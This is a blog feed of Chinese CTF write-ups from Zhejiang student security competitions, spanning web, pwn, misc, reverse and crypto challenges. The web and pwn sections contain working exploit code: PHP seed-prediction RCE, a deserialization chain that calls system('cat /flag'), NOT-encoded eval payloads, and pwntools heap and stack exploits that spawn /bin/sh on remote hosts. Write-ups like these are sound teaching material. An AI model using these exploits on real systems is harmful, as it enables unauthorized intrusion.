    <content><![CDATA[Webezphp&lt;?phperror_reporting(0);highlight_file(__FILE__);mt_srand(time());$a = array(&quot;system&quot;,$_GET[&#x27;cmd&#x27;]);for ($i=0;$i&lt;=10000;$i++)&#123;    array_push($a,&quot;Ctfer&quot;);&#125;shuffle($a);$a[$_GET[&#x27;b&#x27;]]($a[$_GET[&#x27;c&#x27;]]);

因为shuffle函数使用伪随机数产生器，所以当时间戳相同时，两个相同数组打乱后产生的两个新数组也相同
在本地编写php代码，获取索引值
&lt;?phperror_reporting(0);mt_srand($_GET[&#x27;a&#x27;]);$a = array(&quot;system&quot;,$_GET[&#x27;cmd&#x27;]);for ($i=0;$i&lt;=10000;$i++)&#123;    array_push($a,&quot;Ctfer&quot;);&#125;shuffle($a);for ($i=0;$i&lt;=10003;$i++)&#123;    if ($a[$i] == &#x27;system&#x27;)&#123;        print_r(&#x27;system:&#x27;.$i.&quot;\n&quot;);    &#125;    if ($a[$i] == $_GET[&#x27;cmd&#x27;])&#123;        print_r(&#x27;cmd:&#x27;.$i.&quot;\n&quot;);    &#125;&#125;

将本地获取到的索引值传入靶机，成功rce
import requestsimport timeimport rewhile True:    cmd=raw_input(&quot;&gt;&gt;&quot;).replace(&quot; &quot;,&#x27;%20&#x27;);    t=int(time.time())    d=requests.get(&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;%(int(t),cmd)).text    system=int(re.findall(&#x27;system:(\d+)&#x27;,d)[0])    c=int(re.findall(&#x27;cmd:(\d+)&#x27;,d)[0])    d=requests.get(&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;%(cmd,c,system))    print(d.text.split(&#x27;&lt;/code&gt;&#x27;)[1])



babysql过滤了空格，用/**/代替

misccheckin_gift两张图片中间拿到Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!
先凯撒位移13位
SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==
base64
IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5
base32
DASCTF&#123;71a67373a43d20f88606430f481cd4e4&#125;
m4a在文件结尾发现一个被反转的压缩包，提取出来一个带密码的压缩包
添加后缀mp4发现存在摩斯
-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....-
得到压缩包密码BA43BCEFC204
解压得到(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN
rot47
WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;
atbash
dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;

Unkn0wnData赛后复现
附件结尾存在一串base64字符串
V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==
解密后用UTF-8编码显示

stegsolve分析图片，0通道中发现一个压缩包
解压得到key.txt
data:000010000000000000000c000000000000000e000000000000002a000000000000001000000000000000040000000000000008000000000000002a0000000000000016000000000000000b000000000000000c000000000000001c000000000000002a000000000000002c0000000000020034000000000000002a0000000000020009000000000000000c000000000000001100000000000000070000000000020017000000000000002a0000000000020017000000000000000b00000000000000080000000000000012000000000000002a000000000002001500000000000000080000000000000004000000000000000f000000000000000a000000000000002a000000000002000e0000000000000008000000000000001c000000000000000a000000000000002a000000000000000400000000000000110000000000000007000000000000000f000000000000002a00000000000200100000000000000004000000000000000e00000000000000080000000000000008000000000000002a000000000002000c0000000000000017000000000002001e0000000000000007000000000000002a0000000000

明显的USB键盘流量
使用脚本提取出来
#!/usr/bin/env pythonimport sysimport osDataFileName = &quot;usb.dat&quot;presses = []normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;def main():    # read data    with open(&#x27;key.txt&#x27;, &quot;r&quot;) as f:        for line in f:            presses.append(line[0:-1])    # handle    result = &quot;&quot;    for press in presses:        if press == &#x27;&#x27;:            continue        if &#x27;:&#x27; in press:            Bytes = press.split(&quot;:&quot;)        else:            Bytes = [press[i:i+2] for i in range(0, len(press), 2)]        if Bytes[0] == &quot;00&quot;:            if Bytes[2] != &quot;00&quot; and normalKeys.get(Bytes[2]):                result += normalKeys[Bytes[2]]        elif int(Bytes[0],16) &amp; 0b10 or int(Bytes[0],16) &amp; 0b100000: # shift key is pressed.            if Bytes[2] != &quot;00&quot; and normalKeys.get(Bytes[2]):                result += shiftKeys[Bytes[2]]        else:            print(&quot;[-] Unknow Key : %s&quot; % (Bytes[0]))    print(&quot;[+] Found : %s&quot; % (result))if __name__ == &quot;__main__&quot;:    main()

得到mik&lt;DEL&gt;mae&lt;DEL&gt;shiy&lt;DEL&gt;&lt;SPACE&gt;:&lt;DEL&gt;FindT&lt;DEL&gt;Theo&lt;DEL&gt;Realg&lt;DEL&gt;Keyg&lt;DEL&gt;andl&lt;DEL&gt;Makee&lt;DEL&gt;It!d&lt;DEL&gt;
去掉删除的字符应该是mimashi FindTheRealKeyandMakeIt!，但是这句话的意思让我们找到真正的key，所以这个应该是假的key
仔细观察删掉的字符，发现正好是key开头，提取出来得到key:Toggled
emoji-aes解密得到flag
hard_Digital_plate赛后复现
foremost可以分离出一张图片，根据名字猜测是oursecret隐写
流量分析，发现是数位板流量
tshark提取tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; out.txt
python提取坐标
nums = []keys = open(&#x27;out.txt&#x27;, &#x27;r&#x27;)result = open(&#x27;result.txt&#x27;, &#x27;w&#x27;)for line in keys:    if int(line[12:16], 16) == 0:        continue    x = int(line[4:6], 16) + int(line[6:8], 16) * 0xff    y = int(line[8:10], 16) + int(line[10:12], 16) * 0xff    result.write(str(x)+&#x27; &#x27;+str(-y)+&#x27;\n&#x27;)keys.close()result.close()

gnuplot画图

得到oursecret密码kfae5y4wi2shwj81y2kda6ax7x
解一下oursecret，拿到U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==
图片备注中看到糟糕，好像有几个字写的太轻了，看不清楚
提取低压感数据，以0xf000作为压感临界值
nums = []keys = open(&#x27;out.txt&#x27;, &#x27;r&#x27;)result = open(&#x27;result.txt&#x27;, &#x27;w&#x27;)for line in keys:    if int(line[12:16], 16) == 0:        continue    x = int(line[4:6], 16) + int(line[6:8], 16) * 0xff    y = int(line[8:10], 16) + int(line[10:12], 16) * 0xff    if int(line[12:16], 16) &lt; 0xf000:        result.write(str(x)+&#x27; &#x27;+str(-y)+&#x27;\n&#x27;)keys.close()result.close()

gnuplot画图

得到key：w12kax
aes解密

reverseezandroid先安装apk，随意输入一个值，返回error！
jadx中搜索关键字，得到判断代码
List&lt;Integer&gt; ccompare = new ArrayList(Arrays.asList(this.compare));Integer[] compare = &#123;404, 220, 436, 368, 220, 436, 412, 452, 432, IntegvalueOf((int) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;String mname = &quot;ccadwjlyah&quot;;

public void onClick(View v) &#123;    String user = MainActivity.this.name.getText().toString().trim();    List&lt;Integer&gt; ppwd = MainActivity.change(MainActivity.this.pass.getT().toString().trim());    if (!user.equals(this.mname) || !ppwd.equals(this.ccompare)) &#123;        Toast.makeText(MainActivity.this, &quot;error！&quot;, 0).show();        return;    &#125;    Toast.makeText(MainActivity.this, &quot;correct！&quot;, 0).show();    MainActivity.this.startActivity(new Intent(MainActivity.this, afterlclass));&#125;

加密函数
public static List&lt;Integer&gt; change(String args) &#123;    char[] ch;    List&lt;Integer&gt; list = new ArrayList&lt;&gt;();    for (char c : args.toCharArray()) &#123;        list.add(Integer.valueOf((c ^ 3) &lt;&lt; 2));    &#125;    return list;&#125;

用户名明文存储，是ccadwjlyah
程序会对输入后的密码加密然后与程序中的compare变量比较
获取compare数组的值，其中有一个成员存储在变量中

解密脚本
a=[404, 220, 436, 368, 220, 436, 412, 452, 432, 200, 412]e=&#x27;&#x27;for i in a:    e+=chr((i&gt;&gt;2)^3)print(e)

得到密码f4n_4ndro1d

赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag
cryptomath因为加密代码(str.index(i)*key+7)%37中取余了37，所以key的值可以认为在0~37的范围内
直接爆破
a=&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;s=&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;for i in range(37):    e=&#x27;&#x27;    for n in range(len(a)):        for j in range(len(s)):            if s[((j*i)+7)%37]==a[n]:                e=e+s[j]                break    print(e)

爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串

flag: 799a03b7a82076f5028059681df1b722
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛初赛-WP</title>
    <url>/posts/f203fa52/</url>
    <content><![CDATA[战队信息Rml
Rank: 32
解题过程Webnisc_easyweb访问/robots.txt，发现/api/record，访问后到/test_api.php，F12得到i=FlagInHere，按题目要求get传参拿到flag
nisc_学校门户网站访问学生系统，任意注册一个用户进入系统拿到flag
吃豆人吃豆魂在index.js中搜到失败返回值，成功返回值就在上一行

base64解密拿到flag
REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==
DASCTF&#123;f235b02382a223fda4ce2ec62148d94c&#125;
PWNbabyheap因为程序存在uaf，所以连续释放两个chunk，可以获取heap段地址，这样可以计算出tcache bin的地址
通过覆盖tcache bin的值，在任意地址放置chunk，设置chunk0的size为0x430，并在chunk0+0x430的位置处构造两个0x20字节的chunk 释放chunk0，获取libc地址，再利用tcache bin，可以以最少的chunk数，在free_hook中写入system函数地址
再次执行free函数调用system(&quot;/bin/sh&quot;)
from pwn import *def add(size):    p.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)    p.sendlineafter(&#x27;size:&#x27;,str(size))def edit(ind,data):    p.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)    p.sendlineafter(&#x27;index:&#x27;,str(ind))    p.sendafter(&#x27;content:&#x27;,data)def show(ind):    p.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)    p.sendlineafter(&#x27;index:&#x27;,str(ind))def free(ind):    p.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)    p.sendlineafter(&#x27;index:&#x27;,str(ind))libc=ELF(&#x27;./libc-2.27.so&#x27;,checksec=0)p=remote(&#x27;1.14.97.218&#x27;,&#x27;27188&#x27;)#p=process(&#x27;./babyheap&#x27;)#gdb.attach(p)add(0x58) #0add(0x58) #1free(0)free(1)show(1)p.readuntil(&#x27; \n&#x27;)d=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(d))heap=d&amp;0xfffffffffffff000+0x70edit(1,p64(heap))add(0x58) #2add(0x58) #3edit(3,p64(0)*2+p64(d-0x10)+p64(d-0x10+0x430))add(0x58) #4add(0x68) #5edit(5,p64(0x0)+p64(0x21)+p64(0)*3+p64(0x21))edit(4,p64(0)+p64(0x431))free(0)show(0)p.readuntil(&#x27; \n&#x27;)d=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))malloc_hook=d-0x60-0x10libc.address=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]system=libc.sym[&#x27;system&#x27;]free_hook=libc.sym[&#x27;__free_hook&#x27;]edit(3,p64(0)*2+p64(free_hook))edit(1,b&#x27;/bin/sh\x00&#x27;)add(0x58) # 6edit(6,p64(system))pause()free(1)p.interactive()


new_stack赛后复现
main函数

后门函数

后门函数会将我们输入的数据写入栈中，刚好最后8字节可以修改X29寄存器的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改X0寄存器，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改got表控制程序流程
from pwn import *p=remote(&#x27;10.201.15.180&#x27;,4444)libc=ELF(&#x27;./libc.so.6&#x27;,checksec=0)e=ELF(&#x27;./pwn1&#x27;,checksec=0)read_1=0x4007f4ret=0x400834puts_got=e.got[&#x27;puts&#x27;]puts=0x400590read=0x400590bss=e.bss(0x100)p.readuntil(&#x27;name&#x27;)p.send(b&#x27;a&#x27;*0x10+p64(puts_got-0x18))p.readuntil(&#x27;go&#x27;)p.send(p64(read_1)+p64(read)+p64(ret))p.send(p64(puts))# 因为正常输出会输出puts函数对应got表项中的数值# 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址# 可以用来获取libc地址d=(u64(p.readuntil(&quot;\nlet&#x27;s go&quot;,drop=1).ljust(0x8,b&#x27;\x00&#x27;))&gt;&gt;8)print(hex(d))libc.address=d-libc.sym[&#x27;puts&#x27;]print(hex(libc.address))system=libc.sym[&#x27;system&#x27;]p.send(p64(read_1)+p64(read)+p64(ret))p.send(p64(system)+p64(read)+p64(0x4007f0))# 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值# 并将puts函数设置为system# 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);p.interactive()

REManyCheck程序在check1中会检测输入是否等于77

在check2中输入的第一个数字的平方要等于3025，第二个数的平方要等于2401

根据reshort16函数得知，将check3输入的数字的高两个字节和低两个字节调换位置后要等于0x66744769


按要求输入完四个数字拿到flag

MISC好怪哦先将文件反转一下
with open(&#x27;fuck.zip&#x27;,&#x27;rb&#x27;) as f:   with open(&#x27;1.zip&#x27;,&#x27;wb&#x27;) as g:      g.write(f.read()[::-1])

flag.png少了文件头，补上89 50 4e 47
crc报错，修改下高度拿到flag
神奇的棋盘赛后复现
lsb查看0通道，发现一串加密字符，base32解密得到LastKey&#123;Yusayyds&#125;
首先是波利比奥斯方阵密码
手搓或者脚本

a=&#x27;11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51&#x27;a=a.split(&#x27;,&#x27;)t=&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;n=&#x27;&#x27;for i in a:    n=n+t[(int(i[0])-1)*5+int(i[1])-1]print(n)


得到AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV
加上key解ADFGVX密码

4441534354467b64383539633431633533306166633163316164393461626439326634626166387d
十六进制转字符串得到flag
segmentFlow赛后复现
文件很小，直接crc爆破

得到解压密码gZinflAte_BasE64

追踪流，发现sa066b32bfb3e7的值在传递zip文件

tshark提取出来
tshark -r segmentFlow.pcapng -Y &quot;http.request&quot; -T fields -e http.file_data &gt; data.txt
提取压缩包部分
f=open(&#x27;data.txt&#x27;,&#x27;r&#x27;)f1=open(&quot;data.zip&quot;,&quot;wb&quot;)data=f.read()data=data.split(&#x27;&amp;sa066b32bfb3e7=&#x27;)for i in range(1,len(data)):    print(data[i][:8],end=&#x27;&#x27;)    f1.write(bytes.fromhex(data[i][:8]))

解压得到flag
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届浙江省大学生网络与信息安全竞赛-WP</title>
    <url>/posts/13f4d784/</url>
    <content><![CDATA[web初赛[easy php]签到题
&lt;?phpclass AAA&#123;    public $cmd=&quot;system(&#x27;cat /flag&#x27;);&quot;;    public function __call($name, $arguments)&#123;        eval($this-&gt;cmd);        return &quot;done&quot;;    &#125;&#125;class BBB&#123;    public $param1;    public function __debuginfo()&#123;        return [            &#x27;debugInfo&#x27; =&gt; &#x27;param1&#x27; . $this-&gt;param1        ];    &#125;&#125;class CCC&#123;    public $func;    public function __toString()&#123;        var_dump(&quot;aaa&quot;);        $this-&gt;func-&gt;aaa();    &#125;&#125;$a = new BBB();$a-&gt;param1 = new CCC;$a-&gt;param1-&gt;func = new AAA;echo urlencode(serialize($a));



初赛[can you read flag]
好像做复杂了

访问页面返回//eval($_GET[a]);
爆破一下看哪些符号能用
可以用取反，例如(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
发现根目录有flag和readflag，flag没有权限读取

base64转一下读取readflag
(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);

执行readflag后要先输入一个y，然后进入循环开始计算式子，大概成功计算100多轮后读取flag并输出

靶机的web目录不能读写，在&#x2F;tmp目录下写一个php脚本用来计算
&lt;?php$desc=array(        0=&gt;array(&quot;pipe&quot;,&#x27;r&#x27;),        1=&gt;array(&quot;pipe&quot;,&#x27;w&#x27;),        2=&gt;array(&quot;file&quot;,&quot;/tmp/error-output.txt&quot;,&#x27;a&#x27;));$a=proc_open(&quot;/readflag&quot;,$desc,$handle);is_resource($a);$wh=$handle[0];$rh=$handle[1];echo &quot;$rh $wh open\n&quot;;var_dump($handle);$read=fread($rh,2096);echo &quot;$read\n&quot;;fwrite($wh,&#x27;y&#x27;);$read=fread($rh,2048);echo &quot;read: &quot;.$read.&quot;\n&quot;;$read=fread($rh,2048);echo &quot;$i:$read\n&quot;;$op=&quot;\$value=&quot;.trim(strtok($read,&quot; =&quot;)).&#x27;;&#x27;;echo $op.&quot;\n&quot;;eval($op);echo $value.&quot;\n&quot;.$op.&quot;\n&quot;;fwrite($wh,strval($value).PHP_EOL);$i=0;while ($i&lt;200)&#123;    $read=fread($rh,2048);    echo &quot;$i:$read\n&quot;;    $op=&quot;\$value=&quot;.trim(strtok($read,&quot; =&quot;)).&#x27;;&#x27;;    eval($op);    fwrite($wh,strval($value).PHP_EOL);        $i++;&#125;

(~%8C%86%8C%8B%9A%92)(~%D7%9A%9C%97%90%DF%DD%AF%BB%C6%88%9E%B7%BE%B1%BC%98%CF%B4%B5%B8%AD%93%9C%CD%B2%C6%A6%A7%B5%86%A6%A7%94%90%BB%AE%90%B5%B2%BB%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%91%BD%8F%9C%B8%AA%96%B3%BC%9B%86%B5%86%94%8C%BB%AE%90%B5%B2%AB%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%91%BD%8F%9C%B8%AA%96%B3%BC%9B%CC%B5%86%94%8C%BB%AE%90%B5%B2%95%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%92%A5%8F%9D%B8%AA%96%B3%BC%B6%89%9B%B8%CE%88%B3%CD%A9%86%9C%92%C6%86%B3%A8%C6%CE%9B%B7%BD%CE%9B%BC%CA%CF%9A%B7%AE%96%B3%BC%9B%97%B5%86%94%B1%BC%96%94%C8%BB%AE%90%94%A6%AB%CE%88%9C%92%C6%95%A7%CD%C6%88%A5%A8%CB%90%B6%96%C6%86%A5%A8%B9%94%A5%92%87%97%A5%86%B6%8C%B5%B8%AD%93%9C%CD%B2%8C%B5%B8%97%97%9D%92%AD%8C%A5%AC%94%C8%BB%AE%8F%8F%9C%CE%C6%86%A5%A7%B1%89%9B%A7%B5%95%A5%AC%98%94%A6%AC%94%C8%BB%AE%90%94%9B%CD%98%C6%B5%B8%97%97%9D%92%AD%8C%A5%A9%8C%88%A7%AB%8C%B1%BC%96%AD%86%9E%BB%CF%94%9E%B8%B9%8A%A5%B8%87%93%A8%85%B9%9B%B0%88%CF%B4%A5%A8%B1%90%9D%86%BE%96%B5%B7%B5%90%B6%BC%AD%CC%9E%BC%BD%89%9C%B8%A9%8A%A7%B8%CB%96%B0%88%CF%B4%9B%92%B9%86%A7%CD%AD%CE%9D%A7%BE%90%B5%B8%97%97%9D%92%AD%8C%A5%AC%94%C8%BB%AE%90%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CA%B1%96%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%B6%94%9C%92%A9%97%A5%B9%87%8A%B6%95%8C%B1%BC%92%A5%CC%9C%92%93%CF%A5%AC%98%94%9B%CD%98%8C%B5%CC%94%91%B4%AB%8C%B1%BC%98%CF%B4%B5%B7%B5%93%A6%A8%AE%C6%A5%91%B5%93%A6%A8%AE%90%B5%B7%B5%90%B3%BB%B6%88%B1%BB%98%8F%B0%88%CF%B4%A5%A8%B1%90%9D%86%BE%96%9C%92%A9%97%A5%BB%90%98%B6%96%CB%94%9C%92%A9%97%A5%BC%CB%96%A7%B8%CB%96%B0%88%CF%B4%BB%AE%90%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CF%B0%BC%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%B6%94%9E%AB%90%94%9C%92%A9%97%A5%B9%87%8A%B6%95%8C%B1%BC%96%AD%89%9C%BB%CF%96%A7%BC%AD%CD%A6%A8%87%CE%A5%AB%CF%96%B3%91%AD%86%9E%A8%CF%90%9C%CC%AD%86%9B%B8%C6%8D%B4%BC%AD%86%A5%A8%B9%94%B3%BC%B6%98%AF%AC%B6%8F%B4%AC%CB%91%B0%86%9C%C8%BB%AE%90%B1%BC%92%A9%95%9E%B8%C7%98%B5%B8%C6%88%B3%96%B5%9C%9D%96%B6%C8%BB%AE%8F%93%9B%92%B9%8C%B4%BC%AD%89%9C%BC%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%AD%CD%A6%A8%87%CE%A5%AC%CB%96%A7%B8%CB%96%B3%96%AD%89%9C%BC%CB%96%A7%B8%CB%96%B0%88%CF%B4%A5%91%9B%86%9E%A7%AD%93%B4%BC%AD%CC%9E%BC%87%